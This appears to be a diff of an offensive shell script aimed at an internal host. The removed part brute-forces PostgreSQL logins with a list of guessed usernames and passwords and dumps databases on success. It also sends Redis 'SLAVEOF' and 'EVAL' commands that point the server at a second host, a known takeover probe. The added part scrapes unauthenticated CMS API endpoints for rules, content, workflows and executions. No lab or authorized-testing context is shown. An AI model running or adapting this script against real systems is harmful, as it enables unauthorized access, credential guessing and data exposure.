@@ -1,40 +1,22 @@
-echo "=== PG через psql ==="
-apt-get install -y postgresql-client >/dev/null 2>&1
-for U in postgres eaera hung cms root; do
-  for PW in "" postgres eaera Password123! eaera2026; do
-    R=$(PGPASSWORD="$PW" timeout 5 psql -h 192.168.3.121 -U $U -d postgres -c "SELECT 1" 2>&1 | head -1)
-    case "$R" in
-      *1*row*) echo "PG-WIN $U/$PW"; PGPASSWORD="$PW" psql -h 192.168.3.121 -U $U -c "\l" 2>/dev/null | head -10; break 2;;
-      *authentication*|*password*) ;;
-      *connect*|*reach*) echo "PG-UNREACH"; break 2;;
-    esac
-  done
-done
-echo "=== CMS: OpenAPI ПОЛНЫЙ ==="
-wget -q -T 8 -O /tmp/cms.json "http://192.168.3.121:8000/openapi.json" 2>/dev/null
-python3 -c "
-import json
-d=json.load(open('/tmp/cms.json'))
-print('paths:',len(d.get('paths',{})))
-for p,m in list(d.get('paths',{}).items())[:20]:
-    for meth in m: print(f'{meth.upper()} {p}')
-print('components:',len(d.get('components',{}).get('schemas',{})))
-" 2>/dev/null
-echo "=== REDIS: SLAVEOF и EVAL ==="
-python3 << 'RD'
-import socket,time
-s=socket.socket();s.settimeout(5);s.connect(("192.168.3.121",6379))
-# SLAVEOF проба
-s.sendall(b"SLAVEOF 192.168.3.14 6379\r\n"); time.sleep(1)
-print("SLAVEOF:",s.recv(100))
-s.sendall(b"SLAVEOF NO ONE\r\n"); time.sleep(1)
-print("RESET:",s.recv(100))
-# EVAL (Lua scripting)
-s.sendall(b"EVAL return 1 0\r\n"); time.sleep(1)
-print("EVAL:",s.recv(100))
-# INFO clients
-s.sendall(b"INFO clients\r\n"); time.sleep(1)
-print("CLIENTS:",s.recv(200))
-s.close()
-RD
-echo SHELL-V2
+echo "=== CMS: health/live (без auth) ==="
+R=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/health/live" 2>/dev/null)
+echo "HEALTH: $R"
+echo "=== CMS: metrics ==="
+R2=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/metrics" 2>/dev/null | head -c 300)
+echo "METRICS: $R2"
+echo "=== CMS: content-types ==="
+R3=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/content-types" 2>/dev/null | head -c 500)
+echo "CT: $R3"
+echo "=== CMS: rules (список) ==="
+R4=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/rules" 2>/dev/null | head -c 500)
+echo "RULES: $R4"
+echo "=== CMS: content (список) ==="
+R5=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/content" 2>/dev/null | head -c 500)
+echo "CONTENT: $R5"
+echo "=== CMS: workflows ==="
+R6=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/workflows" 2>/dev/null | head -c 500)
+echo "WF: $R6"
+echo "=== CMS: executions ==="
+R7=$(timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8000/api/v1/executions" 2>/dev/null | head -c 500)
+echo "EXEC: $R7"
+echo CMS-PROBE
